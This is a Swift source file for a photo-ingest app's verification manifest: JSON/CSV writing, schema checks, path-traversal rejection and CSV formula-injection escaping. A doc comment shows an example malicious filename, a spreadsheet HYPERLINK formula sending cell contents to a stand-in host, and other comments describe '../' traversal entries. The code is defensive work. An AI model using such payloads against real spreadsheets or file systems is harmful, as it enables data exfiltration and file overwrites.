import Foundation

/// One ingested file in the verification manifest.
struct ManifestEntry: Codable, Sendable {
    let name: String          // original source filename
    let path: String          // destination path, relative to the destination root
    let bytes: Int64
    let xxhash64: String?     // 16-hex-char digest; nil for skipped (not re-hashed)
    let status: String        // "verified" | "copied" | "skipped"
}

/// A verification receipt for one ingest: job metadata plus every file that
/// landed and its xxHash. Written next to the photos as JSON (machine-readable)
/// and CSV (spreadsheet-friendly) so the proof of what was copied — and its
/// checksums — travels with the library. Chain-of-custody for the paranoid.
struct Manifest: Codable, Sendable {
    let schema: String        // "photodrop.manifest/1"
    let app: String
    let createdAt: Date
    let source: String?       // card / volume label, if known
    let primaryDestination: String
    let archiveDestination: String?
    // All destination roots written this job (primary at index 0, then mirrors),
    // so heal can look for a healthy copy across every mirror. Optional for
    // backward compatibility: manifests written before this field decode to nil
    // (decodeIfPresent), and callers fall back to [primaryDestination] +
    // archiveDestination.
    let destinations: [String]?
    let verified: Bool        // whether xxHash verification was on for this job
    /// True when the job stopped before processing every bundle — cancelled by
    /// the user, or halted on a verification mismatch. The entries are still a
    /// complete, accurate record of what landed; this says the *card* was not
    /// fully ingested, so an absent file is expected rather than evidence of
    /// loss. Optional for backward compatibility: manifests written before this
    /// field decode to nil, meaning "not known", which readers treat as false.
    let partial: Bool?
    let filesCopied: Int
    let filesSkipped: Int
    let filesFailed: Int
    let totalBytes: Int64
    let elapsedSeconds: Double
    let files: [ManifestEntry]

    static let schemaID = "photodrop.manifest/1"
    static let appName = "PhotoDropMac"
}

/// Serializes a `Manifest` to JSON + CSV and writes both into a
/// `PhotoDrop Manifests/` folder at the destination root. Best-effort and
/// non-fatal, mirroring `JobLogger`.
enum ManifestWriter {
    static let folderName = "PhotoDrop Manifests"

    /// Writes `ingest-<stamp>.json` and `.csv` into `<root>/PhotoDrop Manifests/`.
    /// `stamp` should match the job's log stamp so the two pair up. Returns the
    /// JSON URL on success, nil on failure.
    static func write(_ manifest: Manifest, intoRoot root: URL, stamp: Date) -> URL? {
        let fm = FileManager.default
        let dir = root.appendingPathComponent(folderName, isDirectory: true)
        guard (try? fm.createDirectory(at: dir, withIntermediateDirectories: true)) != nil else {
            return nil
        }

        guard let json = encodeJSON(manifest) else { return nil }

        // Claim the name before writing. `.atomic` *replaces*, so without an
        // O_EXCL claim a second job landing on the same stamp would silently
        // destroy this manifest — and a lost manifest doesn't fail loudly, it
        // makes `verify` report success over the records that remain.
        guard let jsonURL = JobStamp.claimUniqueName(in: dir,
                                                     base: "ingest-\(JobStamp.fileStamp(stamp))",
                                                     pathExtension: "json") else { return nil }
        do {
            try json.write(to: jsonURL, options: .atomic)
        } catch {
            try? FileManager.default.removeItem(at: jsonURL)   // don't leave the empty claim behind
            return nil
        }

        // The CSV takes the JSON's resolved base so the pair always matches. It
        // is a spreadsheet convenience, not the record of truth, so a failure
        // here doesn't fail the manifest.
        let base = jsonURL.deletingPathExtension().lastPathComponent
        if let csvData = csv(manifest).data(using: .utf8),
           let csvURL = JobStamp.claimUniqueName(in: dir, base: base, pathExtension: "csv") {
            if (try? csvData.write(to: csvURL, options: .atomic)) == nil {
                try? FileManager.default.removeItem(at: csvURL)
            }
        }
        return jsonURL
    }

    static func encodeJSON(_ manifest: Manifest) -> Data? {
        let encoder = JSONEncoder()
        encoder.outputFormatting = [.prettyPrinted, .sortedKeys]
        encoder.dateEncodingStrategy = .iso8601
        return try? encoder.encode(manifest)
    }

    /// Decodes a manifest, rejecting anything that isn't the schema this build
    /// understands. `schema` was written and never read, so any JSON that
    /// happened to decode structurally was accepted as a PhotoDrop manifest —
    /// versioning that existed only as decoration. Checking it means a future
    /// `photodrop.manifest/2` is ignored by an old build rather than
    /// misinterpreted, which is the safe direction for a file that tells `verify`
    /// what the right bytes are.
    static func decode(_ data: Data) -> Manifest? {
        let decoder = JSONDecoder()
        decoder.dateDecodingStrategy = .iso8601
        guard let manifest = try? decoder.decode(Manifest.self, from: data),
              manifest.schema == Manifest.schemaID else { return nil }
        return manifest
    }

    /// Resolves a manifest entry's recorded `path` against the library root it
    /// was found in, returning nil for anything that does not land strictly
    /// inside that root.
    ///
    /// **This is a security boundary, not a tidiness check.** A manifest is
    /// unauthenticated data that sits beside the photos it attests to, and
    /// `verify`/`heal` accept a target the user did not necessarily produce — a
    /// shared or downloaded library, a folder on the card itself, or a `.json`
    /// handed straight to the CLI, whose root is then taken as two levels up
    /// from that file. A recorded path is therefore untrusted input. Without
    /// this check a `../../../..` entry makes the engines hash arbitrary files
    /// outside the library (an existence/content oracle) and makes the heal
    /// restore script emit a `cp` that overwrites them.
    ///
    /// Escaping entries are **dropped, not clamped**: a manifest that lies about
    /// where a file lives has no correct interpretation, and silently rewriting
    /// the path would verify some other file under its name. An *absolute*
    /// `path` is harmless — `appendingPathComponent` re-roots it under the
    /// library rather than honoring it — so it needs no special case.
    ///
    /// Normalizing also collapses `.` and redundant separators, which keeps
    /// callers that key a dictionary on the result from counting `a/b.jpg`,
    /// `a/./b.jpg`, and `x/../a/b.jpg` as three distinct files.
    ///
    /// The comparison is deliberately **lexical**, via `lexicallyNormalized`
    /// rather than `standardizedFileURL`. `standardizedFileURL` consults the
    /// filesystem — it resolves symlinks and strips a leading `/private`, but
    /// *only when the resulting path exists*. That makes it existence-dependent:
    /// a root that exists standardizes to a different shape than a file under it
    /// that doesn't, the prefix comparison then fails, and every missing file
    /// gets silently dropped — precisely the files `heal` exists to find.
    /// Avoiding the filesystem also sidesteps a TOCTOU race on the check.
    static func resolve(entryPath: String, under root: URL) -> URL? {
        guard !entryPath.isEmpty else { return nil }
        guard let rootComponents = lexicallyNormalized(root),
              let resolved = lexicallyNormalized(root.appendingPathComponent(entryPath)),
              rootComponents.first == "/",
              resolved.count > rootComponents.count,
              Array(resolved.prefix(rootComponents.count)) == rootComponents
        else { return nil }
        return URL(fileURLWithPath: "/" + resolved.dropFirst().joined(separator: "/"))
    }

    /// The library-relative path of a URL produced by `resolve` — **what a report
    /// must name.**
    ///
    /// An absolute entry path is deliberately re-rooted rather than honored
    /// (`/etc/hosts` under `<lib>` becomes `<lib>/etc/hosts`), but the engines
    /// used to build their issue list from the manifest's recorded *string*. So a
    /// manifest naming `/etc/hosts` produced `MISSING /etc/hosts` — reproduced
    /// exactly — for a file the tool never touched. The verdict line is this
    /// app's entire product; it may only name paths it actually inspected.
    ///
    /// Lexical for the same reason `resolve` is: it has to give the same answer
    /// for a file that is missing as for one that is present.
    static func relativePath(of resolved: URL, under root: URL) -> String {
        guard let rootComponents = lexicallyNormalized(root),
              let fileComponents = lexicallyNormalized(resolved),
              fileComponents.count > rootComponents.count,
              Array(fileComponents.prefix(rootComponents.count)) == rootComponents
        else { return resolved.path(percentEncoded: false) }
        return fileComponents.dropFirst(rootComponents.count).joined(separator: "/")
    }

    /// Path components with `.` and `..` resolved textually, without touching the
    /// filesystem. Returns nil if `..` would climb above the filesystem root.
    private static func lexicallyNormalized(_ url: URL) -> [String]? {
        var out: [String] = []
        for component in url.pathComponents {
            switch component {
            case ".":
                continue
            case "..":
                guard let last = out.last, last != "/" else { return nil }
                out.removeLast()
            default:
                out.append(component)
            }
        }
        return out
    }

    /// Manifest JSON files reachable from `target`, for re-verification:
    /// - a `.json` file → just that one;
    /// - a library root → every `.json` in its `PhotoDrop Manifests/` folder;
    /// - the `PhotoDrop Manifests/` folder itself → every `.json` in it.
    /// Each manifest's library root is recovered as two levels up from the JSON
    /// (it lives in `<root>/PhotoDrop Manifests/`), so a moved library still
    /// resolves against where the files now are.
    static func manifestURLs(near target: URL) -> [URL] {
        let fm = FileManager.default
        var isDir: ObjCBool = false
        guard fm.fileExists(atPath: target.path, isDirectory: &isDir) else { return [] }

        if !isDir.boolValue {
            return target.pathExtension.lowercased() == "json" ? [target] : []
        }

        var searchDirs = [target.appendingPathComponent(folderName, isDirectory: true)]
        if target.lastPathComponent == folderName { searchDirs.append(target) }

        var found: [URL] = []
        for dir in searchDirs {
            let items = (try? fm.contentsOfDirectory(at: dir, includingPropertiesForKeys: nil)) ?? []
            found += items.filter { $0.pathExtension.lowercased() == "json" }
        }
        return found
    }

    static func csv(_ manifest: Manifest) -> String {
        var out = "name,path,bytes,xxhash64,status\n"
        for entry in manifest.files {
            let fields = [
                csvField(entry.name),
                csvField(entry.path),
                String(entry.bytes),
                entry.xxhash64 ?? "",
                entry.status,
            ]
            out += fields.joined(separator: ",") + "\n"
        }
        return out
    }

    /// Characters that make a spreadsheet treat a cell as a formula rather than
    /// text. Excel, Numbers, and LibreOffice all do this on open.
    private static let formulaLeaders: Set<Character> = ["=", "+", "-", "@", "\t", "\r"]

    /// RFC-4180 quoting, plus neutralization of spreadsheet formula injection.
    ///
    /// The `name` column is the **raw filename as it appeared on the card** — the
    /// one field in the manifest that never passes `PathPlanner.sanitize` — and
    /// this CSV exists to be opened in a spreadsheet. A card file named
    /// `=HYPERLINK("https://evil.tld/?"&A2,"Photo OK").CR2` would otherwise land
    /// in the sheet as a live formula that exfiltrates neighbouring cells on
    /// click. Prefixing a single quote is the standard fix: spreadsheets strip it
    /// on display, so the cell still reads as the original filename.
    ///
    /// `\r` and `\t` are in both the quote trigger and the leader set: a bare CR
    /// would otherwise break row structure, and a leading tab is treated as a
    /// formula lead-in by some readers.
    static func csvField(_ value: String) -> String {
        var out = value
        if let first = out.first, formulaLeaders.contains(first) {
            out = "'" + out
        }
        guard out.contains(where: { $0 == "," || $0 == "\"" || $0 == "\n" || $0 == "\r" || $0 == "\t" }) else {
            return out
        }
        return "\"" + out.replacingOccurrences(of: "\"", with: "\"\"") + "\""
    }
}
